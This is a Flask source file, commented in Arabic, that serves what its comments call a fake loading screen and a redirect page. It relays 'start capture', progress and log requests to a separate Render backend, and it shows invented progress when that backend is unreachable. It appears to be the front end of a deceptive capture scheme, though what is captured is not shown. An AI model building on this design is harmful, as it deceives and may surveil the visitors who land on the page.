# -*- coding: utf-8 -*-
from flask import Flask, render_template, jsonify, request, redirect, url_for
import requests
import json
import os
import time
from datetime import datetime

app = Flask(__name__)

# ---------- تكوين التواصل مع Render ----------
RENDER_API_URL = "https://your-render-app.onrender.com"  # غيّر هذا إلى رابط Render

# ---------- مسارات Vercel ----------
@app.route('/')
def loading_page():
    """شاشة التحميل الوهمية"""
    return render_template('loading.html')

@app.route('/redirect')
def redirect_page():
    """صفحة إعادة التوجيه"""
    return render_template('redirect.html')

@app.route('/api/start-capture')
def start_capture():
    """طلب بدء الالتقاط من Render"""
    try:
        response = requests.post(f"{RENDER_API_URL}/api/start", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/progress')
def progress():
    """جلب التقدم من Render"""
    try:
        response = requests.get(f"{RENDER_API_URL}/api/progress", timeout=3)
        return jsonify(response.json())
    except Exception as e:
        # إذا كان Render غير متاح، نعرض تقدم وهمي
        return jsonify({
            'status': 'loading',
            'progress': 50,
            'message': 'جاري التحميل...'
        })

@app.route('/api/log')
def get_log():
    """جلب السجل من Render"""
    try:
        response = requests.get(f"{RENDER_API_URL}/api/log", timeout=3)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'log': [], 'total': 0})

# ---------- تشغيل التطبيق ----------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
